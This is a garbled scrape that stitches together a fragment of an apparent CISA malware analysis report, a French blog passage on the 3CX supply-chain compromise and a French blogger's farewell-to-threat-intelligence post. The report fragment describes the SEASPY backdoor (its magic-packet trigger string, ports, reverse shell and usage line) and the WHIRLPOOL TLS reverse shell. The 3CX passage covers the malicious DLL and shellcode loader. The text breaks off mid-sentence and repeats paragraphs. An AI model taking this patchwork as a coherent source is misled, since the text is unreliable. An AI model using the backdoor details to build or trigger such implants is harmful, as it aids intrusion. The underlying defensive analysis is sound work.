			--End argument--&lt;/p&gt;

&lt;p&gt;This artifact is an initialization script. Upon its execution it sets terminal settings to default using the 'stty sane' command. It then runs through the process of setting a runlevel variable and stops other services that were started by a previous runlevel. It also kills any services that are running on the current runlevel. Next, the script will start its associated services at the current runlevel. After logging functionalities are started, the script will then check if the runlevel is 3, which will result in the terminal screen being cleared using /usr/bin/clear. Finally, the script contains the command “/sbin/BarracudaMailService eth0” at the end. BarracudaMailService will be started automatically when the initialization script is run on the network interface eth0. BarracudaMailService is a known name for the SEASPY backdoor.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This variant of SEASPY has had its symbols stripped. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the TA's C2 through TCP packets.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "TfuZ". When the right sequence of packets is captured this SEASPY variant launches an authentication sequence prior to launching the reverse shell. Once the TA authenticates, the malware starts a reverse shell on the infected system. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument--&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 32-bit ELF file that has been identified as a malware variant named "WHIRLPOOL". The malware takes two arguments (C2 IP and port number) from a module to establish a Transport Layer Security (TLS) reverse shell. The module that passes the arguments was not available for analysis.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Document FAQ&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;What is a MIFR?&lt;/strong&gt; A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What is a MAR?&lt;/strong&gt; A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.&lt;/p&gt;

Le but est lorsque le logiciel 3CX va faire sa mise à jour, il va installer en plus une dll malveillante qu’il va charger. L’impact est direct puisque l’attaquant à la main sur l’ensemble des machines dont la mise à jour a été faite.&lt;/p&gt;&lt;p&gt;Dans notre cas, c’est la dll ffmpeg.dll qui va être installée.&lt;/p&gt;&lt;p&gt;Ensuite comme l’explique Volexity, la dll télécharge après son chargement un fichier hosté sur github qui est encodé en base64 et chiffré en AES. Ce fichier a des urls ou le malware va être téléchargé.&lt;/p&gt;&lt;h3&gt;Le stealer lui-même&lt;/h3&gt;&lt;p&gt;On a d’abord parlé de stealer mais le malware est plus un outil de reconnaissance. En effet, au vu du nombre d’utilisateurs de 3CX (12 millions), l’attaquant a cette technique de pêche au chalut, va devoir trier. Pour cela, il se base sur les informations remontées sur le C2 dans un fichier json ainsi que la GUID de la machine qui passe dans les headers HTTPs. Si la machine l’intéresse, il va maintenir le C2.&lt;/p&gt;&lt;p&gt;Autre impact fort, mis en avant par Volexity, est un chargeur de shellcode. Ce qui veut dire qu’une fois, le malware exécuté, il peut charger ce qu’il veut comme code. Et surtout faire cela uniquement en mémoire. Cela sera donc plus difficile aux équipes de réponses sur incident et aux analystes de savoir ce que souhaite réellement l’attaquant.&lt;/p&gt;&lt;h3&gt;L’attribution à la nord Corée&lt;/h3&gt;&lt;p&gt;L’attaque a été attribuée par Lazarus.

On ne peut pas faire de bonne threat intelligence si on n’a pas de bonne télémétrie. Ce n’est pas en faisant des recherches dans Virustotal tous les jours ou en mettant des règles yara, et/ou en lançant des requêtes dans Shodan que l’on fera de la bonne threat intelligence. Il faut de la remontée via de la réponse d’incident, via des EDRs, AVs (ce que vous souhaitez en fait) pour vous constituer une bonne visibilité des méthodes qu’utilisent les attaquants. La recherche en sources ouvertes de nouveaux TTPs ne montre qu’une partie de l’iceberg et finalement peut être totalement trompeuse sur l’aspect général. La recherche en sources ouvertes ne suffit pas à faire de l’attribution correcte d’attaques informatiques. Elle permet de dessiner certains contours, de valider certaines hypothèses, ce qui est déjà pas mal vous me direz, mais aujourd’hui, ça me laisse sur ma faim, voir pire par moment, ça peut donner une illusion de connaissance qui est en fait que de la petite information comme dans la rubrique des faits divers d’un quotidien. Les honeypots ne sont pas non plus suffisants car trop facilement détectables. Ca sert pour quelques types de menaces comme certains botnets qui ne sont pas les affutés du tiroir mais c’est tout.&lt;/p&gt;&lt;p&gt;Donc un conseil si vous devez souscrire à un service de Threat Intelligence, allez là ou il y a une vraie télémétrie. Les autres sources de données vous seront utiles mais grandement insuffisantes.&lt;/p&gt;&lt;p&gt;La seconde est que l’on manque cruellement d’outils et de développeurs sur les outils déjà présents pour les maintenir. Et qu’avant être analyste de malware, hunter ou quoi que ce soit d’autre, je suis avant tout ingénieur. Un ingénieur, on l’a un peu souvent oublié ces dernières années , c’est quelqu’un qui résout des problèmes en y apportant des solutions techniques et théoriques. Je vais donc me concentrer la dessus. Pas mal déjà de projets à maintenir comme yeti, l’application de monitoring DNS, des bindings, des transforms pour l’application Maltego. Plusieurs articles sont à venir d’ailleurs autour de ces sujets là.&lt;/p&gt;&lt;p&gt;Troisième et dernière chose, une ouverture à d’autres sujets pas forcement CTI que j’aimerai prendre le temps d’explorer.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;l’apprentissage d’autres langages de programmation&lt;/li&gt;&lt;li&gt;en analyse de malware, aller plus loin sur certaines notions, utilisez plus d’émulateur pour les packers plutôt que se faire tout à chaque fois à la main.&lt;/li&gt;&lt;li&gt;AS et BGP&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Je continuerai de mon coté à maintenir mon niveau de connaissance en CTI, ainsi que le suivi de certains groupes. Idem pour l’analyse de malware. Mais c’est juste que ça ne fera plus l’objet de publication sur ce blog, ni dans des conférences. Fini les Chinois \o/&lt;/p&gt;&lt;p&gt;A vous les studios !&lt;/p&gt;&lt;img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;amp;referrerSource=full_rss&amp;amp;postId=4c53c576a986" width="1" /&gt;</description><content:encoded>&lt;h3&gt;La Threat Intel, c’est fini !&lt;/h3&gt;&lt;p&gt;Derrière ce titre un peu provocateur, c’est pour annoncer que je ne publierai plus d’article de CTI et ce pour plusieurs raisons.&lt;/p&gt;&lt;p&gt;La première est d’un point vue honnêteté intellectuelle.

Les honeypots ne sont pas non plus suffisants car trop facilement détectables. Ca sert pour quelques types de menaces comme certains botnets qui ne sont pas les affutés du tiroir mais c’est tout.&lt;/p&gt;&lt;p&gt;Donc un conseil si vous devez souscrire à un service de Threat Intelligence, allez là ou il y a une vraie télémétrie. Les autres sources de données vous seront utiles mais grandement insuffisantes.&lt;/p&gt;&lt;p&gt;La seconde est que l’on manque cruellement d’outils et de développeurs sur les outils déjà présents pour les maintenir. Et qu’avant être analyste de malware, hunter ou quoi que ce soit d’autre, je suis avant tout ingénieur. Un ingénieur, on l’a un peu souvent oublié ces dernières années , c’est quelqu’un qui résout des problèmes en y apportant des solutions techniques et théoriques. Je vais donc me concentrer la dessus. Pas mal déjà de projets à maintenir comme yeti, l’application de monitoring DNS, des bindings, des transforms pour l’application Maltego. Plusieurs articles sont à venir d’ailleurs autour de ces sujets là.&lt;/p&gt;&lt;p&gt;Troisième et dernière chose, une ouverture à d’autres sujets pas forcement CTI que j’aimerai prendre le temps d’explorer.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;l’apprentissage d’autres langages de programmation&lt;/li&gt;&lt;li&gt;en analyse de malware, aller plus loin sur certaines notions, utilisez plus d’émulateur pour les packers plutôt que se faire tout à chaque fois à la main.&lt;/li&gt;&lt;li&gt;AS et BGP&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Je continuerai de mon coté à maintenir mon niveau de connaissance en CTI, ainsi que le suivi de certains groupes. Idem pour l’analyse de malware. Mais c’est juste que ça ne fera plus l’objet de publication sur ce blog, ni dans des conférences.
